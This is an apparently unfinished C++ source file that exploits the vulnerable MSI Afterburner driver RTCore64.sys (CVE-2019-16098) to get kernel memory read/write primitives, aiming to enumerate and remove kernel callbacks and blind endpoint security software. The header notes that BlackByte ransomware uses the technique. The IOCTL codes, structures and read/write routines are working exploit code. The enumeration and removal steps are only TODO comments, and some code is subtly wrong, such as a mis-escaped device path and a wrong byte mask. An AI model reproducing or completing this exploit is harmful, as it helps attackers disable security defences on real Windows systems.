/*
    By: ReverseThrottle @ReverseThrottle
    Identify kernel callbacks and remove them ussing RTCore64.sys vulnerability within MSI Afterburner
    !!Disclaimer I am not an expert and am using resources that I find the information/code 
    !!Disclaimer I present is not new and heavily inspired by my resources that I mention below
    CVE-2019-16098 - https://github.com/Barakat/CVE-2019-16098/blob/master/CVE-2019-16098.cpp - Heavily used code for kernel read/write primitives
    Other resources:
    CheeckyBlinder - https://github.com/br-sn/CheekyBlinder @no bs
    Kernel Ps Callbacks - http://blog.deniable.org/posts/windows-callbacks/ @fdiskyou
    BlackByte Ransomware utilizes techinque - https://www.picussecurity.com/resource/blog/blackbyte-ransomware-bypasses-edr-products-via-rtcore64.sys-abuse

*/



#include <Windows.h>
#include <aclapi.h>
#include <Psapi.h>
#include <cstdio>
#include <iostream>
#include <ntstatus.h>



struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;


DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return MemoryRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
}
BYTE ReadMemoryBYTE(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 1, Address) & 0xffffff;
}


WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}


void Log(const char* Message, ...) {
    const auto file = stderr;

    va_list Args;
    va_start(Args, Message);
    std::vfprintf(file, Message, Args);
    std::fputc('\n', file);
    va_end(Args);
}



int main()
{
    //
    //Determine Windows version
    //
    NTSTATUS status;
    OSVERSIONINFOEXW osVersion;
    osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
    status = RtlGetVersion((POSVERSIONINFOW)&osVersion);                                // Figure out how to call RtlGetVersion...??
    if (status != STATUS_SUCCESS) {
        Log("Failed to obtain version information..Error code: %d", GetLastError());
        return -1;
    }
    switch (osVersion.dwBuildNumber)
    {
    case 19041:
        Log("Windows 10, Version 2004 detected");

    }
    /*
        TODO Finish version checking
    */


    //
    // Determine required offsets based on Windows version
    //
    
    /*
        Finsih later
    */

    
    //
    // Obtain handle to RTCore64.sys 
    //
    HANDLE hRTCore64;
    hRTCore64 = CreateFile(L"\\.\RTCore64", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hRTCore64 == INVALID_HANDLE_VALUE) {
        Log("[!] Failed to obtain handle to RTCore64...Error Code: %d\nIs driver enabled??", GetLastError());
        return -1;
    }
    Log("[*] RTCore device handle has been obtained!\nHandle: %p", hRTCore64);

    //
    // Obtain ntoskrnl base address
    //


    //
    // Obtain PsSetCreateNotifyRoutine()
    //

    //
    // Obtain PspSetCreateNotifyROutine()
    //

    //
    //Enumerate callback array
    //

}

